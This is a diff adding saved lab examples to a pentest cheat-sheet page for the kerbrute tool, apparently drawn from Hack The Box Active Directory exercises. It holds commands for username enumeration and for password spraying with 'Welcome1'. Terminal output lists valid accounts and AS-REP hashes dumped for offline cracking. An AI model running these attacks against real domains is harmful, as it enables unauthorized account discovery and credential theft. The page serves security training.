@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=kerbrute) · [All tools](/index)
+
 ## Commands
 
 **Kali**
@@ -21,8 +23,182 @@ kerbrute userenum -d DOMAIN --dc DC_IP users.txt
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=kerbrute)
+## Notebook recipes
 
-## Learning and original examples
+6 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Kerbrute — Startup and User Enumeration](/tools/kerbrute)
+<AccordionGroup>
+
+<Accordion title="using ldap search">
+
+### using ldap search
+
+**AD Password Policies and User Lists**
+
+```bash
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 jsmith.txt
+```
+
+</Accordion>
+
+<Accordion title="Internal password spraying from linux">
+
+### Internal password spraying from linux
+
+**Active Directory Password Spraying**
+
+```bash
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
+```
+
+</Accordion>
+
+<Accordion title="Identifying Users">
+
+### Identifying Users
+
+**Initial Active Directory Enumeration**
+
+```bash
+htb-student@ea-attack01]─[~]
+└──╼ $kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (9cfb81e) - 07/21/26 - Ronnie Flathers @ropnop
+
+2026/07/21 08:49:17 >  Using KDC(s):
+2026/07/21 08:49:17 >   172.16.5.5:88
+
+2026/07/21 08:49:17 >  [+] VALID USERNAME:       jjones@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:17 >  [+] VALID USERNAME:       sbrown@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:17 >  [+] VALID USERNAME:       tjohnson@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:17 >  [+] VALID USERNAME:       jwilson@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:17 >  [+] VALID USERNAME:       bdavis@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       asanchez@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       njohnson@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       dlewis@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       ccruz@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:e4546b6938e4d52567482d2ee39ff9a4$ff2824b5638c0efcf9c5d2521f8f3e834339ca0ede1c1cbb43a870e2a4016249547116f5cb6efbe7dafe6ed9494782c7e598940ed23ed69db4ae3f5273cffdc42ac7f10ab9b198b9761c12213a7f7f364399383a13bfefa01e78ac125c41729ecc53589eda6f767967d9c87c2aef95efd4149a5d925dfa0a8ce4fd4725ed96a7687d142b8959956ce9e2129464c3a102d05a7bddec9ce90970ccf7b79860d8f794c93c106e8704919dc414886c5a02456f0ff501f173ec1b2657a2edd74bb581187004a3bff0d40542f9ec482789961e4154b1374a16db7153e1eb3c648b9c6483ee4337fca6acc9d35bbbfbcb643400f45f1636637c35353e48be50655a898c9ce754e5756a687a7eeb                                                           
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       mmorgan@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       rramirez@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       jwallace@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       jsantiago@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       gdavis@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       mrichardson@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       mharrison@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       tgarcia@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       jmay@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       jmontgomery@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       jhopkins@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:19 >  [+] VALID USERNAME:       dpayne@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:19 >  [+] VALID USERNAME:       mhicks@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:19 >  [+] VALID USERNAME:       adunn@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:19 >  [+] VALID USERNAME:       lmatthews@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:19 >  [+] VALID USERNAME:       avazquez@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:19 >  [+] VALID USERNAME:       mlowe@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:19 >  [+] VALID USERNAME:       jmcdaniel@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:19 >  [+] VALID USERNAME:       csteele@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:20 >  [+] VALID USERNAME:       mmullins@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:21 >  [+] VALID USERNAME:       mochoa@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:21 >  [+] VALID USERNAME:       aslater@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:22 >  [+] VALID USERNAME:       ehoffman@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:22 >  [+] VALID USERNAME:       ehamilton@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:22 >  [+] VALID USERNAME:       cpennington@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:23 >  [+] VALID USERNAME:       srosario@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:23 >  [+] VALID USERNAME:       lbradford@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:24 >  [+] VALID USERNAME:       halvarez@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:24 >  [+] VALID USERNAME:       gmccarthy@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:24 >  [+] VALID USERNAME:       dbranch@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:25 >  [+] VALID USERNAME:       mshoemaker@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:26 >  [+] VALID USERNAME:       mholliday@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:26 >  [+] VALID USERNAME:       ngriffith@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:26 >  [+] VALID USERNAME:       sinman@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:26 >  [+] VALID USERNAME:       minman@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:26 >  [+] VALID USERNAME:       rhester@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:27 >  [+] VALID USERNAME:       rburrows@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:28 >  [+] VALID USERNAME:       dpalacios@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:29 >  [+] VALID USERNAME:       strent@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:30 >  [+] VALID USERNAME:       fanthony@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:30 >  [+] VALID USERNAME:       evalentin@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:30 >  [+] VALID USERNAME:       sgage@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:30 >  [+] VALID USERNAME:       jshay@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:32 >  [+] VALID USERNAME:       jhermann@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:32 >  [+] VALID USERNAME:       whouse@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:32 >  [+] VALID USERNAME:       emercer@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:34 >  [+] VALID USERNAME:       wshepherd@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:35 >  Done! Tested 48705 usernames (56 valid) in 17.512 seconds
+```
+
+</Accordion>
+
+<Accordion title="Kerbrute — Startup and User Enumeration">
+
+### Kerbrute — Startup and User Enumeration
+
+**Kerbrute — Startup and User Enumeration**
+
+```bash
+./kerbrute --help
+./kerbrute userenum --help
+```
+
+</Accordion>
+
+<Accordion title="Retrieving the AS-REP Using Kerbrute">
+
+### Retrieving the AS-REP Using Kerbrute
+
+**Miscellaneous Misconfigurations**
+
+```shellsession
+grcic550@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: dev (9cfb81e) - 04/01/22 - Ronnie Flathers @ropnop
+
+2022/04/01 13:14:17 >  Using KDC(s):
+2022/04/01 13:14:17 >   172.16.5.5:88
+
+2022/04/01 13:14:17 >  [+] VALID USERNAME:   sbrown@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:   jjones@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:   tjohnson@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:   jwilson@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:   bdavis@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:   njohnson@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:   asanchez@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:   dlewis@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:   ccruz@inlanefreight.local
+2022/04/01 13:14:17 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:400d306dda575be3d429aad39ec68a33$8698ee566cde591a7ddd1782db6f7ed8531e266befed4856b9fcbbdda83a0c9c5ae4217b9a43d322ef35a6a22ab4cbc86e55a1fa122a9f5cb22596084d6198454f1df2662cb00f513d8dc3b8e462b51e8431435b92c87d200da7065157a6b24ec5bc0090e7cf778ae036c6781cc7b94492e031a9c076067afc434aa98e831e6b3bff26f52498279a833b04170b7a4e7583a71299965c48a918e5d72b5c4e9b2ccb9cf7d793ef322047127f01fd32bf6e3bb5053ce9a4bf82c53716b1cee8f2855ed69c3b92098b255cc1c5cad5cd1a09303d83e60e3a03abee0a1bb5152192f3134de1c0b73246b00f8ef06c792626fd2be6ca7af52ac4453e6a
+
+<SNIP>
+```
+
+</Accordion>
+
+<Accordion title="AS-REP Roasting: Quick Reference">
+
+### AS-REP Roasting: Quick Reference
+
+**AS-REP Roasting: Quick Reference**
+
+Context from the notebook: Combine with username enumeration ( kerbrute userenum ) to build the userlist for the no-creds path.
+
+```text
+kerbrute userenum
+```
+
+</Accordion>
+
+</AccordionGroup>
